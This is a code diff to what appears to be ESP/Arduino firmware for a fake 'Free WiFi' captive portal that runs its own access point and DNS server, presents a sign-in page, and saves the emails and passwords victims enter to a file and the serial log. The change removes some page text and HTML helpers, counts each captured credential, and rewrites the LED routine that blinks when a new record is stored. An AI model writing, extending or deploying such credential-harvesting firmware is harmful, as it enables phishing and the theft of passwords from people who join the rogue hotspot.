@@ -6,27 +6,12 @@
 
 // User configuration
 #define SSID_NAME "Free WiFi"
-#define SUBTITLE "Free WiFi service."
-#define TITLE "Sign in:"
-#define BODY "Create an account to get connected to the internet."
-#define POST_TITLE "Validating..."
-#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
-#define PASS_TITLE "Credentials"
-#define CLEAR_TITLE "Cleared"
-#define WEB_TITLE "Sign in to use Free WiFi"
-
-// Function prototypes
-void readData();
-void writeData(String data);
-void deleteData();
 
 // Init System Settings
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
 IPAddress APIP(172, 0, 0, 1);  // Gateway
 
-String data = "";
-String Credentials = "";
 int savedData = 0;
 int timer = 5000;
 int i = 0;
@@ -41,32 +26,6 @@ String input(String argName) {
   a.replace(">", "&gt;");
   a.substring(0, 200);
   return a;
-}
-
-String header(String t) {
-  return "<!DOCTYPE html>"
-         "<html lang=\"en\">"
-         "<head>"
-         "<meta charset=\"UTF-8\" />"
-         "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />"
-         "<title>Nemo Test</title>"
-         "<style>"
-         "@import url(\"https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap\");"
-         "</style>"
-         "</head>"
-         "<body>";
-}
-
-String footer() {
-  return "</body></html>";
-}
-
-String creds() {
-  return "<></>";
-}
-
-String clear() {
-  return "<></>";
 }
 
 String clearCredentials() {
@@ -95,6 +54,7 @@ void saveCredentials(String email, String password) {
   
   file.close();
   Serial.println("Credentials saved: " + formattedData);
+  savedData++;
 }
 
 String getCredentials() {
@@ -223,17 +183,28 @@ void setup() {
 }
 
 void loop() {
-  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
+  if ((millis() - lastTick) > TICK_TIMER) { 
+    lastTick = millis(); 
+  }
+
   dnsServer.processNextRequest();
   webServer.handleClient();
 
-  i++;
-  if (i == timer && savedData == 1) {
-    i = 0;
+  // Handle LED blinking for saved records
+  static bool ledActive = false;
+  static unsigned long ledStartTime = 0;
+
+  if (savedData > 0 && !ledActive) {
+    // Turn on the LED if a new record is saved and it isn't already active
     digitalWrite(LED_BUILTIN, LOW);
-    delay(1000);
-    digitalWrite(LED_BUILTIN, HIGH);
-    delay(50);
+    ledActive = true;
+    ledStartTime = millis();
+    savedData--;
   }
-  if (i > timer) { i = 0; }
+
+  if (ledActive && (millis() - ledStartTime >= 1000)) {
+    // Turn off the LED after 1000ms
+    digitalWrite(LED_BUILTIN, HIGH);
+    ledActive = false;
+  }
 }
